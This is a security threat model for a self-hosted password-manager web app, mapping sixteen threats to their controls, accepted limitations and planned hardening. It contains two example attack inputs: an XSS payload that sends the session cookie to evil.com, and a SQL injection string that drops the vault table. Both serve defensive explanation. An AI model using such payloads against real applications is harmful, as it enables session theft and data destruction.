# SecureVault — Threat Model

This document answers the question: **"What could go wrong, how bad would it be, and what have we done about it?"**

It is organised as a formal threat model — a structured way of thinking about security before something breaks rather than after. It identifies what we are protecting, who might try to take it, every realistic attack scenario, what controls exist, and what risk we knowingly accept.

If you're reading this after a security incident, start with Section 5 (Threat Analysis) and look up the threat ID that matches what happened. If you're reviewing before shipping a new phase, check Section 7 (Future Phase Recommendations) for open items.

**Companion document:** `docs/architecture.md` explains in detail *how* each control works. This document focuses on *what* threats those controls address and how well.

---

## Table of Contents

1. [Scope and Assumptions](#1-scope-and-assumptions)
2. [Assets](#2-assets)
3. [Threat Actors](#3-threat-actors)
4. [Attack Surface](#4-attack-surface)
5. [Threat Analysis](#5-threat-analysis)
6. [Known Accepted Limitations](#6-known-accepted-limitations)
7. [Risk Summary](#7-risk-summary)
8. [Recommendations for Future Phases](#8-recommendations-for-future-phases)

---

## 1. Scope and Assumptions

### What this threat model covers

- The SecureVault FastAPI web application running as a local or private-server single-user instance
- All phases completed to date: Phase 1 (MVP) through Phase 5 (Engineering Quality)
- The database file, log files, session cookie, and configuration (`.env`)

### What is out of scope

- The operating system, hardware, network infrastructure, or hosting provider
- The user's authenticator app (Google Authenticator, Authy) — we trust the TOTP standard
- Physical security of the device running the server
- Future phases (multi-user Phase 8, browser extension Phase 10) introduce new attack surfaces not covered here

### Baseline assumptions

- The server is running on a trusted machine (your local computer or a VPS you control)
- `SECRET_KEY` was generated randomly (at least 32 bytes of entropy) and stored in `.env`
- The master password is reasonably strong (not in common password lists)
- HTTPS is used in production (enforced by HSTS; HTTP is acceptable in local development)

---

## 2. Assets

These are the things worth protecting, ranked by how damaging their compromise would be.

| Asset | Location | Impact if compromised |
|---|---|---|
| **Vault entry secrets** (usernames, passwords, notes) | Database — AES-256-GCM encrypted | CRITICAL — the primary data the app exists to protect |
| **Master password** | Never stored — in memory during login only | CRITICAL — allows vault key derivation |
| **Vault encryption key** (derived at login) | Session memory + encrypted session cookie | CRITICAL — directly decrypts all vault entries |
| **SECRET_KEY** | `.env` file on disk | CRITICAL — controls session cookie encryption; leak = attacker can forge sessions |
| **Session cookie** (`sv_session`) | Browser cookie store | HIGH — contains encrypted vault key; compromise = vault access for session duration |
| **TOTP secret** | Database — AES-256-GCM encrypted | HIGH — compromise allows generating valid 2FA codes indefinitely |
| **Recovery codes** | Shown once to user; Argon2id-hashed in database | HIGH — can bypass 2FA if all 8 are captured |
| **`kdf_salt`** | Database — plaintext | MEDIUM — required for offline brute-force; useless without the password |
| **Database file** (`securevault.db`) | Disk | HIGH — contains encrypted secrets + plaintext metadata |
| **Log files** (`logs/app.log`, `logs/audit.log`) | Disk | LOW — user IDs, IPs, timestamps; no secrets ever logged |
| **Application source code** | Disk / git | LOW — open source; security by obscurity is not our model |

### What is NOT an asset we protect

- **Plaintext metadata:** `title`, `website`, `category` are intentionally stored unencrypted to support search. Compromise of the database file exposes these.
- **Entry counts and timestamps:** visible in both the database and audit logs.

---

## 3. Threat Actors

These are the types of people who might try to attack SecureVault, in order of likelihood for a typical deployment.

### TA-1: Remote Unauthenticated Attacker
An attacker on the internet with no credentials and no physical access. The most common threat actor for any web application. They interact only through the `/login` and `/setup` endpoints, and static assets.

**Motivation:** Steal vault contents (financial credentials, accounts).
**Capability:** Can send arbitrary HTTP requests; can run automated scripts; cannot read server memory or disk directly.

### TA-2: Network Attacker
An attacker positioned on the same network as the user — for example, on public Wi-Fi — who can observe or intercept traffic between the browser and the server.

**Motivation:** Steal session cookies or credentials in transit.
**Capability:** Can capture unencrypted HTTP traffic; cannot break HTTPS if certificates are valid.

### TA-3: Local Attacker
An attacker with physical access to the machine running SecureVault — either the server or the user's computer. Includes a malicious person who borrows your laptop.

**Motivation:** Read database file, `.env` file, or memory dump.
**Capability:** Can read any file the running process can read; may be able to inspect running process memory.

### TA-4: Automated Scanner / Bot
Automated tools that probe for common web vulnerabilities (SQL injection, path traversal, default credentials, etc.). Usually not targeting SecureVault specifically — opportunistic scanning.

**Motivation:** Find exploitable vulnerabilities quickly.
**Capability:** High volume, low sophistication; relies on known vulnerability patterns.

### TA-5: Supply Chain Attacker
An attacker who compromises one of SecureVault's Python dependencies (FastAPI, cryptography, argon2-cffi, SQLAlchemy, pyotp, etc.) by publishing a malicious version.

**Motivation:** Compromise many applications at once through a trusted channel.
**Capability:** Can inject arbitrary code into the application if a compromised package is installed.

---

## 4. Attack Surface

Everything an attacker can interact with, from the outside:

```
┌─────────────────────────────────────────────────────────────────┐
│                    EXTERNAL ATTACK SURFACE                       │
│                                                                  │
│  HTTP Endpoints                                                  │
│  ├── GET  /setup           — first-run vault creation           │
│  ├── POST /setup           — receives new master password       │
│  ├── GET  /login           — login form                         │
│  ├── POST /login           — receives master password           │  ← highest value target
│  ├── POST /logout          — clears session                     │
│  ├── GET  /vault           — dashboard (requires auth)          │
│  ├── POST /entry/new       — receives form data (requires auth) │
│  ├── POST /entry/{id}/edit — receives form data (requires auth) │
│  ├── POST /entry/{id}/delete — (requires auth)                  │
│  ├── POST /vault/import    — FILE UPLOAD (requires auth)        │  ← untrusted file input
│  ├── GET  /vault/export    — file download (requires auth)      │
│  ├── GET/POST /2fa/*       — 2FA setup and verification         │
│  └── GET  /static/*        — CSS, JS assets (public)           │
│                                                                  │
│  Session Cookie (sv_session)                                     │
│  └── Sent by browser on every request to localhost:8000         │
│                                                                  │
│  Form Inputs                                                     │
│  └── title, website, category, username, password, notes,       │
│      csrf_token, TOTP token, recovery code, file upload         │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    LOCAL ATTACK SURFACE                          │
│                                                                  │
│  Files on Disk                                                   │
│  ├── securevault.db          — encrypted vault data             │  ← most valuable file
│  ├── .env                    — SECRET_KEY                       │  ← second most valuable
│  ├── logs/app.log            — operational debug log            │
│  └── logs/audit.log          — security event log              │
│                                                                  │
│  Process Memory (during active session)                          │
│  └── Decrypted vault values, session encryption key             │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Threat Analysis

### How to read this section

Each threat has:
- **ID:** Reference code (T-01, T-02, …)
- **Category:** STRIDE classification (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)
- **Actor:** Which threat actor from Section 3
- **Scenario:** Exactly how the attack works
- **Controls:** What we have in place to stop it
- **Residual risk:** What remains after controls
- **Likelihood / Impact / Risk:** Rated Low / Medium / High / Critical

Risk = Likelihood × Impact. A low-likelihood critical event can still be High risk.

---

### T-01 — Database File Theft

| Field | Detail |
|---|---|
| **Category** | Information Disclosure |
| **Actor** | TA-3 (Local attacker) |
| **Likelihood** | Low |
| **Impact** | High |
| **Risk** | **Medium** |

**Scenario:**
An attacker obtains a copy of `securevault.db` — either by physical access to the machine, a server breach, or a backup that was not properly secured. They open the file with a SQLite viewer.

**What they see:**
```
id | title   | website        | username_encrypted     | password_encrypted
───┼─────────┼────────────────┼────────────────────────┼──────────────────────
1  | GitHub  | github.com     | AQIAAA...encrypted...  | gAAAAAB...encrypted...
2  | Gmail   | gmail.com      | Zm9vYm...encrypted...  | X5yGCB...encrypted...
```

The `title`, `website`, and `category` columns are plaintext — the attacker knows what services you have accounts for. The encrypted columns are unreadable blobs. Without the vault encryption key (which requires the master password), the actual usernames and passwords are inaccessible.

**Controls in place:**
- AES-256-GCM field-level encryption on all sensitive columns
- Argon2id KDF (64 MiB RAM, ~200ms) makes brute-forcing the key from the `kdf_salt` slow

**Residual risk:**
- `title`, `website`, `category` visible — tells attacker which services you use
- If the master password is very weak (e.g., "password123"), an offline brute-force attack on the `kdf_salt` is feasible over time

**Mitigation for residual risk:** Use a strong master password (random 20+ character passphrase). Protect backups with the same security as the database itself.

---

### T-02 — Online Password Brute Force

| Field | Detail |
|---|---|
| **Category** | Spoofing, Elevation of Privilege |
| **Actor** | TA-1 (Remote unauthenticated), TA-4 (Automated scanner) |
| **Likelihood** | Medium |
| **Impact** | Critical |
| **Risk** | **Medium** |

**Scenario:**
An attacker writes a script that sends thousands of POST /login requests with different passwords, attempting to guess the master password.

**Controls in place:**
1. **Argon2id slowness:** Each attempt takes ~200ms server-side. The server can only process ~5 genuine attempts per second per thread, regardless of how fast the attacker sends requests.
2. **Rate limiting with IP lockout:** After a configurable number of failures, the source IP is locked out and receives 429 Too Many Requests with a Retry-After header.
3. **CSRF requirement:** A valid CSRF token must be included with every POST /login. Bots without a valid token get a 403 from the CSRF middleware before the rate limiter ever sees them — those fake attempts don't count toward the failure counter.
4. **Timing equalisation:** When no vault exists, Argon2id still runs against a dummy hash. Response time does not reveal whether a vault has been set up.

**Residual risk:**
- Rate limiter state is in-memory only — a server restart resets all counters, giving an attacker fresh attempts. Argon2id slowness is the permanent defence.
- A user on the same IP as the attacker could be locked out collaterally (shared NAT, company proxy).
- Very weak master passwords (~4 characters, dictionary words) remain crackable even with rate limiting if the attacker is patient.

---

### T-03 — Offline Vault Key Brute Force (After DB Theft)

| Field | Detail |
|---|---|
| **Category** | Elevation of Privilege |
| **Actor** | TA-3 (Local attacker with DB copy) |
| **Likelihood** | Low |
| **Impact** | Critical |
| **Risk** | **Medium** |

**Scenario:**
An attacker who has obtained `securevault.db` runs a brute-force attack offline, attempting to derive the vault encryption key by trying passwords against the stored `kdf_salt`. Unlike the online attack (T-02), there is no rate limiting — the attacker is running Argon2id locally.

**Controls in place:**
- **Argon2id parameters (64 MiB, time_cost=3, parallelism=4):** Even on dedicated cracking hardware, each attempt requires 64 MiB of RAM. A GPU with 8 GB of VRAM can run ~125 parallel Argon2id guesses simultaneously. At ~200ms per guess, that is roughly 625 guesses/second on expensive hardware.
- **OWASP comparison:** A 10-character random lowercase password has ~1.4 × 10¹⁴ combinations. At 625 guesses/second, exhaustive search would take ~7 million years.

**Residual risk:**
- Common passwords, dictionary words, or passwords derived from personal information (birthdates, names) can be cracked quickly — the Argon2id parameters only help against random passwords.
- A purpose-built ASIC cracker that bypasses the memory-bandwidth bottleneck would reduce this timeline.

**Mitigation for residual risk:** Use a truly random master password — a passphrase of 5+ random words (diceware-style) is both memorable and cryptographically strong. Avoid passwords based on personal information.

---

### T-04 — Cross-Site Scripting (XSS)

| Field | Detail |
|---|---|
| **Category** | Information Disclosure, Elevation of Privilege |
| **Actor** | TA-1 (Remote attacker who can create vault entries) |
| **Likelihood** | Low |
| **Impact** | High |
| **Risk** | **Low** |

**Scenario:**
An attacker creates a vault entry with a malicious title like `<script>fetch('https://evil.com?c='+document.cookie)</script>`. When the vault dashboard renders, the script executes and exfiltrates the session cookie.

**Controls in place (three independent layers):**
1. **Jinja2 auto-escaping:** `{{ entry.title }}` renders `<script>` as `&lt;script&gt;` — visible text, never executed code. This alone blocks the attack entirely.
2. **Content Security Policy:** Even if HTML escaping were somehow bypassed, CSP blocks inline scripts (`script-src 'self'`) and blocks requests to external origins.
3. **HttpOnly session cookie:** Even if JavaScript somehow ran, `document.cookie` returns empty — the `sv_session` cookie is invisible to JavaScript.

**Residual risk:** Negligible. Three independent controls must all fail simultaneously.

---

### T-05 — Cross-Site Request Forgery (CSRF)

| Field | Detail |
|---|---|
| **Category** | Tampering |
| **Actor** | TA-1 (Remote attacker via malicious website) |
| **Likelihood** | Very Low |
| **Impact** | High |
| **Risk** | **Very Low** |

**Scenario:**
A malicious website `evil.com` contains a hidden form that auto-submits to `http://localhost:8000/entry/123/delete`. When the user visits `evil.com` while logged into SecureVault, the browser automatically attaches the `sv_session` cookie, and the delete operation executes without the user's knowledge.

**Controls in place (two independent layers):**
1. **CSRF synchronizer token:** Every mutating request must include a `csrf_token` that matches what's stored in the encrypted session. `evil.com` cannot read this token (same-origin policy) so cannot include it. Mismatch = 403 Forbidden.
2. **SameSite=strict cookie:** The `sv_session` cookie is not sent on any cross-site request at all — the browser blocks it before the request even reaches our server. The attack fails before the CSRF token check.

**Residual risk:** None with both controls in place.

---

### T-06 — Session Cookie Interception

| Field | Detail |
|---|---|
| **Category** | Information Disclosure, Elevation of Privilege |
| **Actor** | TA-2 (Network attacker) |
| **Likelihood** | Low (production); Medium (local HTTP dev) |
| **Impact** | Critical |
| **Risk** | **Low (production); Medium (development)** |

**Scenario:**
An attacker on the same network (e.g., public Wi-Fi, corporate network) captures the `sv_session` cookie from an unencrypted HTTP request and uses it to make authenticated requests to the vault.

**Controls in production:**
- HTTPS encrypts all traffic in transit — the cookie cannot be read from a captured packet
- HSTS tells browsers to always use HTTPS — prevents accidental HTTP connections even if the user types `http://`
- Fernet encryption of the cookie payload — even if the token is captured, decrypting it requires `SECRET_KEY`
- `Secure` cookie attribute — browser only sends the cookie over HTTPS connections

**Controls in local development (HTTP only):**
- Fernet encryption is still in place — cookie payload is opaque even over HTTP
- Rate limiting blocks bulk attempts with a stolen cookie
- Session TTL limits the window of opportunity

**Residual risk:** In production with HTTPS, risk is very low. In local development over HTTP on a shared network, the Fernet-encrypted cookie token could be captured and replayed until it expires. This is an accepted trade-off for development convenience.

---

### T-07 — Session Fixation

| Field | Detail |
|---|---|
| **Category** | Elevation of Privilege |
| **Actor** | TA-1, TA-3 |
| **Likelihood** | Very Low |
| **Impact** | Critical |
| **Risk** | **Very Low** |

**Scenario:**
An attacker plants a known session token (e.g., by injecting a cookie via XSS before login) and waits for the user to log in. If the server promotes the existing session to authenticated status without clearing it first, the attacker's pre-planted session becomes authenticated.

**Control in place:**
`session.clear()` is called at the **beginning** of every successful login before any session keys are written:
```python
session.clear()                          # wipe any pre-existing data
session["encryption_key"] = key_b64     # then write new keys
session["user_id"] = user.id
```
Any pre-planted session data is overwritten. The attacker's token is now empty and the newly written session keys are different.

**Residual risk:** None.

---

### T-08 — TOTP Code Replay

| Field | Detail |
|---|---|
| **Category** | Spoofing |
| **Actor** | TA-2 (Network attacker) |
| **Likelihood** | Very Low |
| **Impact** | High |
| **Risk** | **Low** |

**Scenario:**
An attacker intercepts a valid 6-digit TOTP code (e.g., by watching over the user's shoulder, intercepting an HTTP request in development, or via malware). They immediately use the same code to complete a login on a second device within the same ~90-second validity window.

**Validity window explanation:**
TOTP codes change every 30 seconds. `pyotp` accepts the current code plus the codes from the previous and next 30-second windows (±1 interval tolerance for clock skew). This means a code is technically valid for up to ~90 seconds total.

**Controls in place:**
- HTTPS in production prevents network interception of the code in transit
- The 5-attempt lockout on `/2fa/verify` prevents brute-forcing 6-digit codes

**Residual risk:**
There is no server-side "used code" tracking — if a valid code is intercepted and replayed within the same 90-second window, the server cannot distinguish the legitimate use from the replay. This is a known limitation (see Section 6.2).

**Scope of risk:** In production with HTTPS, intercepting the code in transit is not feasible. The realistic replay window requires local device compromise (malware, shoulder-surfing) which is outside our threat model.

---

### T-09 — Recovery Code Exposure

| Field | Detail |
|---|---|
| **Category** | Spoofing, Elevation of Privilege |
| **Actor** | TA-3 (Local attacker, shoulder-surfer) |
| **Likelihood** | Low |
| **Impact** | High |
| **Risk** | **Medium** |

**Scenario:**
The 8 recovery codes are displayed in plaintext in the browser at 2FA setup time. If the screen is photographed, the browser is compromised, or the codes are stored insecurely (e.g., in an unencrypted notes app), an attacker can use them to bypass 2FA.

**Controls in place:**
- Codes are shown **once only** — not stored in plaintext, not re-displayable
- Argon2id-hashed in `recovery_codes.code_hash` — cannot be reversed from the database
- Single-use: each code is marked with `used_at` timestamp on consumption; it is permanently invalidated
- Recovery attempts are rate-limited to 5 before the mid-login session is wiped

**Residual risk:**
If all 8 codes are captured before being used, an attacker who also knows the master password can log in even without the authenticator. **This is inherent to the recovery code concept** — recovery codes exist precisely to provide access when the authenticator is unavailable, which means they are an alternative to the authenticator.

**User guidance:** Store recovery codes offline in a secure physical location (written on paper, in a safe). Do not store them in digital notes unless those are themselves encrypted.

---

### T-10 — SECRET_KEY Exposure

| Field | Detail |
|---|---|
| **Category** | Elevation of Privilege, Information Disclosure |
| **Actor** | TA-3 (Local attacker), TA-5 (Server breach) |
| **Likelihood** | Low |
| **Impact** | Critical |
| **Risk** | **High** |

**Scenario:**
An attacker reads the `.env` file and obtains the `SECRET_KEY` value. This key is used (via HKDF) to derive the Fernet key that encrypts all session cookies.

**Consequence of SECRET_KEY exposure:**
1. **Decrypt existing cookies:** Any captured `sv_session` cookie (from network logs, browser dev tools) can now be decrypted — revealing the vault encryption key and user_id.
2. **Forge new cookies:** The attacker can craft a valid `sv_session` cookie with arbitrary contents, granting themselves a fully authenticated session without knowing the master password.

**Controls in place:**
- `.env` excluded from git via `.gitignore` — never committed to source control
- `.env` file permissions should be restricted to the owner (`chmod 600 .env`)
- `SECRET_KEY` is never logged

**Residual risk:**
A server breach that gives the attacker read access to the filesystem exposes both `SECRET_KEY` (from `.env`) and `securevault.db`. At that point, forging a session may be easier than cracking Argon2id. **Protecting `SECRET_KEY` is the highest priority operational security task.**

**If you suspect SECRET_KEY is compromised:**
1. Generate a new `SECRET_KEY` immediately
2. Restart the server — all existing sessions are instantly invalidated (their Fernet tokens are now undecryptable)
3. Log in fresh — the vault data itself is unaffected (it is encrypted with the vault key, not SECRET_KEY)

---

### T-11 — SQL Injection

| Field | Detail |
|---|---|
| **Category** | Information Disclosure, Tampering, Elevation of Privilege |
| **Actor** | TA-1, TA-4 |
| **Likelihood** | Very Low |
| **Impact** | Critical |
| **Risk** | **Very Low** |

**Scenario:**
An attacker enters `'; DROP TABLE vault_entries; --` in a form field, hoping it gets interpolated directly into a SQL query.

**Control in place:**
Every database operation goes through the SQLAlchemy ORM:
```python
db.query(VaultEntry).filter(VaultEntry.user_id == user_id, VaultEntry.id == entry_id).first()
```
This compiles to `SELECT ... WHERE user_id = ? AND id = ?` — the `?` placeholders are filled by the database driver, which treats the values as data, never as SQL syntax. No raw SQL string concatenation exists anywhere in the codebase.

**Residual risk:** None. SQLAlchemy's parameterised queries are a complete defence.

---

### T-12 — Malicious File Import

| Field | Detail |
|---|---|
| **Category** | Tampering, Denial of Service |
| **Actor** | TA-1 (authenticated), TA-3 |
| **Likelihood** | Very Low |
| **Impact** | Low–Medium |
| **Risk** | **Very Low** |

**Scenario:**
An attacker uploads a malicious KeePass XML file containing an XML bomb (a deeply nested entity expansion that expands to gigabytes — also known as a "billion laughs" attack) to exhaust server memory.

**Controls in place:**
- **`defusedxml`:** Replaces Python's standard `xml.etree` with a hardened parser that blocks all known XML attack vectors: entity expansion, external entity injection (XXE), DTD processing
- **5 MB upload limit:** Any file larger than 5 MB is rejected before parsing begins
- **Extension check:** Only `.xml` and `.csv` are accepted; other formats are rejected with a descriptive error

**Residual risk:** A maliciously crafted but valid XML or CSV with very long field values in otherwise valid entries could create many large strings in memory. The 5 MB limit bounds the worst case.

---

### T-13 — Login Endpoint Flooding (DoS)

| Field | Detail |
|---|---|
| **Category** | Denial of Service |
| **Actor** | TA-1, TA-4 |
| **Likelihood** | Medium |
| **Impact** | Medium |
| **Risk** | **Medium** |

**Scenario:**
A botnet floods POST /login with thousands of requests per second. Even if Argon2id limits each genuine attempt to ~200ms, enough parallel requests could saturate the server's CPU and memory.

**Controls in place:**
- **CSRF gating:** Requests without a valid CSRF token receive a 403 immediately (microseconds) without triggering Argon2id at all. Bots cannot easily generate valid CSRF tokens.
- **IP lockout:** After the failure threshold is reached, subsequent requests from that IP get a 429 response without Argon2id running at all
- **Argon2id itself:** Legitimate attempts are naturally throttled to ~5/second/thread on the server

**Residual risk:**
A distributed attack from many IPs could generate many CSRF-invalid 403 responses very quickly — these are cheap to generate but still consume server bandwidth. A full DDoS mitigation (nginx rate limiting, Cloudflare, etc.) is out of scope for the current phases. Added in Phase 6 (nginx reverse proxy).

**Note:** Rate limiter state is in-memory only. A server restart resets all counters — an attacker who can trigger restarts (e.g., via OOM conditions) can reset the lockout. Argon2id slowness is the permanent brute-force defence.

---

### T-14 — Authenticated Page Cache Leakage

| Field | Detail |
|---|---|
| **Category** | Information Disclosure |
| **Actor** | TA-3 (shared browser / physical access) |
| **Likelihood** | Low |
| **Impact** | High |
| **Risk** | **Very Low** |

**Scenario:**
A user logs out of SecureVault on a shared computer. The next person using the browser presses the Back button and sees a cached copy of the vault dashboard, complete with decrypted passwords, without any authentication.

**Control in place:**
Every authenticated response includes:
```
Cache-Control: no-store
```
This instructs the browser to never write the response to any cache (memory or disk). The Back button forces a fresh server request, which goes through AuthGuard, finds no session, and redirects to `/login`.

**Residual risk:** None — `no-store` is a complete defence for this scenario.

---

### T-15 — Log File Exfiltration

| Field | Detail |
|---|---|
| **Category** | Information Disclosure |
| **Actor** | TA-3 (local access), server breach |
| **Likelihood** | Low |
| **Impact** | Low |
| **Risk** | **Low** |

**Scenario:**
An attacker reads `logs/app.log` and `logs/audit.log` hoping to find passwords, encryption keys, or vault content.

**Controls in place:**
- Code-level rule (enforced throughout codebase): never log passwords, derived keys, decrypted field values, or session tokens
- Audit log contains only: timestamp, event name, user_id, IP address, entry_id, count — no secret values
- Application log contains only: operation descriptions and error messages — no secret values
- Both files use rotating handlers with size limits (10 MB × backups) — old logs are automatically purged

**Residual risk:**
Logs do reveal: which user IDs exist, what IP addresses logged in, when entries were created/modified/deleted, how many entries were imported. This is metadata, not secrets — but it does confirm usage patterns and vault size.

**What an attacker learns from logs:**
```json
{"ts": "2024-06-06T14:32:01.123+00:00", "event": "login_success", "user_id": 1}
{"ts": "2024-06-06T14:32:05.456+00:00", "event": "entry_created", "user_id": 1, "entry_id": 42}
```
They learn that user 1 logged in and created entry 42. They do not learn what the entry contains.

---

### T-16 — Supply Chain Attack

| Field | Detail |
|---|---|
| **Category** | All STRIDE categories |
| **Actor** | TA-5 (Supply chain) |
| **Likelihood** | Low |
| **Impact** | Critical |
| **Risk** | **Medium** |

**Scenario:**
An attacker publishes a malicious version of a key dependency — for example, `cryptography`, `argon2-cffi`, or `pyotp` — that contains a backdoor. When the next `pip install -r requirements.txt` runs (or during a version upgrade), the malicious code is installed and can do anything the application process can do: read the database, exfiltrate the vault key, send data to an attacker's server.

**Controls in place:**
- `requirements.txt` pins minimum version numbers (e.g., `cryptography>=42.0.0`)
- `pip-audit` dependency vulnerability scanning is planned for Phase 6 — checks installed packages against the CVE database
- `trufflehog` secret scanning is planned for Phase 6 — scans code for accidentally committed secrets

**Residual risk:**
- No hash-pinned lockfile (e.g., `pip-compile` with `--generate-hashes`) — a malicious version bump could slip in during an upgrade
- `pip-audit` detects known CVEs, not novel backdoors
- Phase 6 addresses this more systematically with CI-based scanning

---

## 6. Known Accepted Limitations

These are security properties that SecureVault does **not** provide, by deliberate design decision. They are documented here so that the risk is explicit and intentional, not overlooked.

---

### L-01 — Server-Side Decryption (Not Zero-Knowledge)

**What it means:**
Vault entries are decrypted on the server (in Python memory) and sent to the browser as rendered HTML. A compromised server process during an active session can read decrypted vault entries — they exist momentarily as Python strings.

**Why it was accepted:**
Zero-knowledge design (where decryption happens entirely in the browser using the Web Cryptography API) requires a JavaScript-heavy Single Page Application architecture — a complete frontend rewrite. For an educational portfolio project, the server-side approach is dramatically simpler and still provides meaningful security: **the data on disk is encrypted and unreadable without the master password**.

**Who is at risk:**
Anyone running SecureVault on a shared server, a cloud VPS, or a machine they do not fully control.

**Who is not at risk:**
Users running SecureVault locally on their own computer, where the "server" is `localhost` on a machine they physically control.

**Future mitigation:** Phase 10 (Browser Extension) or a future SPA phase would move decryption to the browser using `window.crypto.subtle` — eliminating this limitation entirely.

---

### L-02 — Python Memory Cannot Be Zeroed

**What it means:**
Python strings and bytes objects are immutable and garbage-collected non-deterministically. When a decrypted password is "out of scope" (the function returns), Python marks the memory for eventual garbage collection — but the bytes containing the plaintext may remain in the Python process's heap for an indeterminate period until the memory is actually reused.

This means:
- A memory dump of the Python process during or shortly after an active session may contain decrypted vault values
- The `session.clear()` on logout removes the encryption key from the session dict, but a copy of the key bytes may still be in the heap

**Why it was accepted:**
Python provides no mechanism to guarantee immediate memory zeroing (unlike C with `memset` or Rust with `Zeroize`). Implementing a workaround (e.g., using `ctypes` to write zeros to the memory address of a string) is fragile, not portable, and breaks on CPython implementation changes. For this application's threat model (local-first, single-user), the risk is low enough to accept.

**Who is at risk:**
Users on shared machines where another process (or the OS) could inspect memory, or where memory forensics is a realistic threat (e.g., law enforcement with memory acquisition tools).

**Who is not at risk:**
Typical home users where physical memory inspection is not a realistic threat.

---

### L-03 — TOTP Code Replay Window

**What it means:**
A valid TOTP code is accepted for approximately 90 seconds (the current 30-second window ± one adjacent window for clock skew tolerance). SecureVault does not maintain a server-side record of used TOTP codes. Therefore, the same code could be used twice within the same 90-second window — once by the legitimate user and once by an attacker who intercepted it.

**Why it was accepted:**
Tracking used codes requires either:
- A server-side database table of recent codes (adds latency and storage for a low-frequency event), or
- A distributed cache if multi-server in future (adds infrastructure complexity)

In practice, this vulnerability requires:
1. The attacker to intercept the 6-digit code (not possible over HTTPS in production)
2. The attacker to act within ~90 seconds of the legitimate use
3. The attacker to have not yet been blocked by the 5-attempt lockout

In a local-first, single-user, HTTPS-protected deployment, this is not a realistic attack vector.

**Who is at risk:**
Development deployments running over HTTP on shared networks (e.g., office Wi-Fi), where the TOTP code could theoretically be captured from unencrypted traffic.

---

### L-04 — Rate Limiter State Is Not Persistent

**What it means:**
The per-IP login failure counter lives in a Python in-memory dictionary. It is lost on every server restart. An attacker who can trigger server restarts (e.g., through a memory exhaustion attack) resets all lockout state and gets fresh attempts.

**Why it was accepted:**
Persistent rate limiting requires a shared store (Redis, a database table) — adding infrastructure complexity. For a single-user local deployment where restarts are rare and deliberate, this is an acceptable trade-off. Argon2id's computational cost (~200ms per attempt) provides independent brute-force protection regardless of lockout state.

**Mitigation in future phases:** Phase 6 (nginx reverse proxy) can implement persistent rate limiting at the HTTP server level using `limit_req_zone`, which is unaffected by application restarts.

---

### L-05 — No Master Password Recovery

**What it means:**
If the master password is forgotten, vault entries are permanently inaccessible. There is no "forgot password" flow, no admin reset, no escrow.

**Why this is intentional, not a limitation:**
Any password reset mechanism must either:
- Store a copy of the encryption key somewhere (defeats the entire security model), or
- Let someone else (an admin, a recovery email) reset it (introduces a second attack surface)

The security property — **"only you can ever access your vault"** — requires this trade-off. It is intentional. Users must keep their master password backed up securely.

---

## 7. Risk Summary

| ID | Threat | Likelihood | Impact | Risk Level |
|---|---|---|---|---|
| T-01 | Database file theft | Low | High | **Medium** |
| T-02 | Online password brute force | Medium | Critical | **Medium** |
| T-03 | Offline vault key brute force | Low | Critical | **Medium** |
| T-04 | Cross-Site Scripting (XSS) | Low | High | **Low** |
| T-05 | Cross-Site Request Forgery | Very Low | High | **Very Low** |
| T-06 | Session cookie interception | Low (prod) | Critical | **Low (prod)** |
| T-07 | Session fixation | Very Low | Critical | **Very Low** |
| T-08 | TOTP code replay | Very Low | High | **Low** |
| T-09 | Recovery code exposure | Low | High | **Medium** |
| T-10 | SECRET_KEY exposure | Low | Critical | **High** |
| T-11 | SQL injection | Very Low | Critical | **Very Low** |
| T-12 | Malicious file import | Very Low | Low–Medium | **Very Low** |
| T-13 | Login endpoint flooding | Medium | Medium | **Medium** |
| T-14 | Cached page leakage | Low | High | **Very Low** |
| T-15 | Log file exfiltration | Low | Low | **Low** |
| T-16 | Supply chain attack | Low | Critical | **Medium** |

### Threats requiring the most attention

**T-10 (SECRET_KEY)** is the highest-rated threat that has no technical control inside the application — it relies entirely on operational security (file permissions, not committing `.env`, protecting server access).

**T-01, T-02, T-03** (database and password attacks) all converge on the same root mitigation: use a strong master password. The cryptographic controls are excellent for strong passwords and inadequate for weak ones.

**T-16** (supply chain) is medium risk now and reduces in Phase 6 when `pip-audit` and hash-pinned lockfiles are introduced.

---

## 8. Recommendations for Future Phases

These are open security items not yet addressed, organised by phase:

### Phase 6 — DevSecOps (planned)
- [ ] Add `pip-audit` to the CI pipeline to automatically scan dependencies for known CVEs on every push
- [ ] Use `pip-compile --generate-hashes` to produce a hash-pinned `requirements.txt` — prevents a malicious package version from being installed undetected (addresses T-16)
- [ ] Configure nginx `limit_req_zone` for persistent rate limiting that survives application restarts (addresses T-13 / L-04)
- [ ] Update `LoginRateLimitMiddleware` to read `X-Forwarded-For` when `ENVIRONMENT=production` — without this, nginx's IP appears as the client address and all users share one rate limit counter
- [ ] Restrict `.env` file permissions to `600` in deployment documentation

### Phase 8 — Multi-User Support (planned)
- [ ] Re-evaluate the threat model entirely — multiple users introduce new threats: user data isolation failures, privilege escalation between users, admin account compromise, registration abuse
- [ ] Per-user `kdf_salt` is already in the schema (future-proof), but audit user isolation in every query
- [ ] Add TOTP used-code tracking if deploying to shared/public environments (addresses L-03 replay window)

### Phase 10 — Browser Extension (planned)
- [ ] Migrate to client-side decryption using `window.crypto.subtle` (Web Cryptography API) — eliminates L-01 (server-side decryption limitation) entirely
- [ ] JWT tokens for the `/api/v1/` REST API introduce new session management concerns — scope tokens with short TTL and rotation

### General (any phase)
- [ ] Consider adding a `Content-Security-Policy-Report-Only` header in development to detect CSP violations before enforcing them in production
- [ ] Add a `Referrer-Policy: no-referrer` header to prevent vault URLs from appearing in third-party server logs if a user clicks an external link from within the vault
- [ ] Evaluate whether `logs/` directory should have restricted permissions (`750`) to prevent other local users from reading audit logs
